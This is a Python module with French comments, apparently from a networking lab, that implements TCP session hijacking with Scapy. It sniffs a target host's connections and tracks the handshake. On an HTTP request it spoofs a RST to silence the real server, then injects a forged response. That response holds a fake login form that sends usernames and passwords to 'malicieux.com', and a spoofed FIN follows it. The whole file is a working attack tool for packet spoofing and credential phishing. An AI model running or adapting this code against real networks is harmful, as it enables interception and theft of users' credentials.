"""
modules/session_hijack.py
Implémentation stricte et robuste du Session Hijacking.
Basé sur la machine à états du TP (WAITING -> SYN -> ACK -> PSH) pour une précision chirurgicale.
Inclut la désynchronisation du serveur réel via RST.
"""
import time
import threading
from scapy.all import sniff, send, IP, TCP, Ether, Raw
from core.logger import log
from core.config import conf

class SessionHijacker:
    def __init__(self, target_ip: str, target_port: int = 80):
        self.target_ip = target_ip
        self.target_port = target_port
        self.running = False
        self.lock = threading.Lock()
        
        # État de la connexion (Machine à états du TP)
        self.state = 'WAITING'
        self.session = {
            "src_ip": None, "dst_ip": None,
            "src_port": None, "dst_port": None,
            "seq_client": None, "seq_server": None
        }

        # Ton Payload HTML original (Hardcodé pour la démo comme dans le TP)
        self.fake_body = (
            '<html><body><h1>FAKE LOGIN FOX</h1>'
            '<form action="http://malicieux.com/voler" method="POST">'
            'Nom d\'utilisateur : <input name="user"><br>'
            'Mot de passe : <input type="password" name="passfoooox"><br>'
            '<input type="submit"></form></body></html>'
        )

    def _reset_state(self):
        """Réinitialise la machine à états pour attendre une nouvelle victime."""
        self.state = 'WAITING'
        self.session = {k: None for k in self.session}
        # log.info("Hijacker: En attente de nouvelle connexion (State: WAITING)...")

    def _handle_packet(self, p):
        if not p.haslayer(TCP) or not p.haslayer(IP):
            return

        # Filtrage strict : on ne veut que ce qui concerne la cible
        if p[IP].src != self.target_ip and p[IP].dst != self.target_ip:
            return

        flags = p[TCP].flags

        # --- MACHINE À ÉTATS (Logique TP améliorée) ---

        # 1. Détection du SYN (Début de connexion)
        if self.state == 'WAITING' and (flags & 0x02): # SYN
            self.session["src_ip"] = p[IP].src
            self.session["dst_ip"] = p[IP].dst
            self.session["src_port"] = p[TCP].sport
            self.session["dst_port"] = p[TCP].dport
            self.session["seq_client"] = p[TCP].seq
            
            self.state = 'SYN_RCVD'
            log.info(f"[HIJACK] SYN détecté : {self.session['src_ip']} -> {self.session['dst_ip']}")

        # 2. Détection du SYN-ACK (Réponse serveur)
        elif self.state == 'SYN_RCVD' and (flags & 0x12) == 0x12: # SYN+ACK
            if p[IP].src == self.session["dst_ip"]:
                self.session["seq_server"] = p[TCP].seq
                self.state = 'SYN_ACK_RCVD'

        # 3. Détection du ACK (Client confirme)
        elif self.state == 'SYN_ACK_RCVD' and (flags & 0x10): # ACK
            if p[IP].src == self.session["src_ip"]:
                self.state = 'ESTABLISHED'
                log.success(f"[HIJACK] Connexion établie et traquée. Prêt à injecter.")

        # 4. Détection de la Requête (HTTP GET/POST) -> L'ATTACK
        elif (self.state == 'ESTABLISHED' or self.state == 'WAITING') and (flags & 0x18): # PSH+ACK (Data)
            # Note: On accepte aussi WAITING ici pour le mode "Hijack à la volée" (si on a raté le SYN)
            if p[IP].src == self.target_ip and p.haslayer(Raw):
                
                # Si on a pris en cours de route, on remplit les infos maintenant
                if self.session["src_ip"] is None:
                    self.session["src_ip"] = p[IP].src
                    self.session["dst_ip"] = p[IP].dst
                    self.session["src_port"] = p[TCP].sport
                    self.session["dst_port"] = p[TCP].dport
                
                # Mise à jour des séquences
                current_seq = p[TCP].seq
                current_ack = p[TCP].ack
                payload_len = len(p[Raw].load)
                
                log.warning(f"[HIJACK] Données reçues ({payload_len} bytes). Injection du Fake Login...")
                self._inject_payload(p, current_seq, current_ack, payload_len)
                
                # On reset pour la prochaine
                self._reset_state()

    def _inject_payload(self, p, seq_client, seq_server, payload_len):
        """Forge les paquets d'injection et de désynchronisation."""
        
        # Construction de la réponse HTTP
        http_resp = (
            f"HTTP/1.1 200 OK\r\n"
            f"Content-Type: text/html\r\n"
            f"Content-Length: {len(self.fake_body)}\r\n"
            f"Connection: close\r\n\r\n"
            f"{self.fake_body}"
        ).encode()

        # 1. Envoi du RST au VRAI serveur (Pour le faire taire)
        # On spoof l'IP du client. Le serveur va croire que le client a coupé.
        rst_pkt = IP(src=p[IP].src, dst=p[IP].dst) / \
                  TCP(sport=p[TCP].sport, dport=p[TCP].dport, flags='R', seq=seq_client + payload_len)
        send(rst_pkt, verbose=False, iface=conf.interface)
        # log.info("-> RST envoyé au serveur légitime.")

        # 2. Envoi de la FAUSSE réponse au Client
        # On spoof l'IP du serveur.
        # SEQ = ACK du client (ce qu'il attend)
        # ACK = SEQ du client + len(data) (pour acquitter sa requête)
        fake_pkt = IP(src=p[IP].dst, dst=p[IP].src) / \
                   TCP(sport=p[TCP].dport, dport=p[TCP].sport, flags='PA', seq=seq_server, ack=seq_client + payload_len) / \
                   http_resp
        
        send(fake_pkt, verbose=False, iface=conf.interface)
        log.success("-> Fake Login injecté avec succès au client.")
        
        # 3. Envoi du FIN (Fermeture propre usurpée)
        fin_pkt = IP(src=p[IP].dst, dst=p[IP].src) / \
                  TCP(sport=p[TCP].dport, dport=p[TCP].sport, flags='FA', seq=seq_server + len(http_resp), ack=seq_client + payload_len)
        send(fin_pkt, verbose=False, iface=conf.interface)

    def start(self):
        self.running = True
        log.info(f"Session Hijacking : Surveillance de {self.target_ip}...")
        try:
            # Filtre BPF précis pour la performance
            sniff(
                iface=conf.interface, 
                filter=f"tcp port {self.target_port} and host {self.target_ip}", 
                prn=self._handle_packet, 
                store=0
            )
        except Exception as e:
            log.error(f"Erreur Hijack : {e}")

    def stop(self):
        self.running = False